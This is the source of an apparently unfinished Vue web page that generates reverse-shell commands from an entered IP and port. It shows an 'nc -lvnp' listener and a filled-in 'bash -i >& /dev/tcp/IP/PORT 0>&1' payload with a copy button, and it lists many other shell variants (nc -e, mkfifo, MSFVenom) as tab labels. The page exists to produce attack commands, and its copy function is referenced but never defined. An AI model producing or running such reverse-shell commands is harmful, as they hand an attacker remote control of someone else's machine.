<template>
    <div class="page1">
      <center class="title"><h1>反弹shell命令生成器</h1></center>
      <div class="header">
        <div class="nleft">
          <p class="ntit">IP & Port</p>
          <div class="n1">
            <el-input v-model="Ipadd" placeholder="输入IP">
              <template #prepend>IP</template>
            </el-input>
          </div>
          <div class="n2">
            <el-input v-model="Port" placeholder="Port">
              <template #prepend>Port</template>
            </el-input>
          </div>
        </div>
      </div>
      <div class="nright">
        <p class="ntit">Listener</p>
        <div class="n3">
          <P>🚀 nc -lvnp {{ Port }}</P>
        </div>
      </div>
      <div class="content">
        <el-tabs type="border-card">
          <el-tab-pane label="Reverse" class="">
            <el-tabs :tab-position="tabPosition" class="demo-tabs">
              <el-tab-pane label="Bash -i">
                <el-row>
                  <p>bash -i >& /dev/tcp/{{ Ipadd }}/{{ Port }} 0>&1</p>
                  <el-button type="primary" size="small" @click="copyText(copytext)">复制</el-button>
                </el-row>
                <el-divider />
                <p>echo xxxxxx== |-d base64 | sh</p>
              </el-tab-pane>
              <el-tab-pane label="Bash 196">Bash196</el-tab-pane>
              <el-tab-pane label="Bash read line">Bash read line</el-tab-pane>
              <el-tab-pane label="Bash 5">Bash 5</el-tab-pane>
              <el-tab-pane label="Bash UDP">Bash UDP</el-tab-pane>
              <el-tab-pane label="NC mkfifo">NC mkfifo</el-tab-pane>
              <el-tab-pane label="nc -e">nc -e</el-tab-pane>
              <el-tab-pane label="nc.exe -e">nc.exe -e</el-tab-pane>
              <el-tab-pane label="BusyBox nc -e">BusyBox nc -e</el-tab-pane>
              <el-tab-pane label="nc -c">nc -c</el-tab-pane>
            </el-tabs>
          </el-tab-pane>
          <el-tab-pane label="Bind">Bind</el-tab-pane>
          <el-tab-pane label="MSFVenom">MSFVenom</el-tab-pane>
          <el-tab-pane label="Echo">Echo</el-tab-pane>
        </el-tabs>
      </div>
    </div>
  </template>
  
  <style>
  .page1{
      background-color:#0a0a0a;
      width: 100%;
      color: aliceblue;
  }
  .header{
      width: 100%;
  }
  .nleft{
      margin: 0 1% 0 1%;
      background-color: hwb(0 12% 88%);
      width: 48%;
      float: left;
      height: 140px;
  }
  .nright{
      background-color: hwb(0 12% 88%);
      width: 48%;
      height: 140px;
      float: left;
      margin: 0 1% 0 1%;
  }
  .ntit{
      color: aliceblue;
      font-size: 22px;
      font-weight: 4px;
      padding: 15px 0 10px 13px;
  }
  .n1{
      width: 30%;
      float: left;
      margin: 10px 10%;
  }
  .n2{
      width: 25%;
      float: left;
      margin: 10px 10%;
  }
  .input-with-select .el-input-group__prepend {
    background-color: var(--el-fill-color-blank);
  }
  .demo-tabs{
      width: 600px;
  }
  .demo-tabs > .el-tabs__content {
    padding: 32px;
    color: #6b778c;
    font-size: 32px;
    font-weight: 600;
  }
  
  .el-tabs--right .el-tabs__content,
  .el-tabs--left .el-tabs__content {
    height: 100%;
  }
  
  .n3{
      margin: 0 25%;
      width: 50%;
      height: 60px;
      background-color: rgb(0, 0, 0);
  }
  .n3 p{
      font-size: 20px;
      line-height: 60px;
      margin: 0 30%;
      white-space: nowrap;
  }
  .content{
      width: 90%;
      margin: 170px 5%;
      color: #3b3b3b;
      height: 500px;
  }
  
  </style>
  <script setup lang="ts">
  import { ref } from 'vue'
  const Ipadd = ref('127.0.0.1')
  const Port = ref('8888')
  const tabPosition = ref('left')
  
  </script>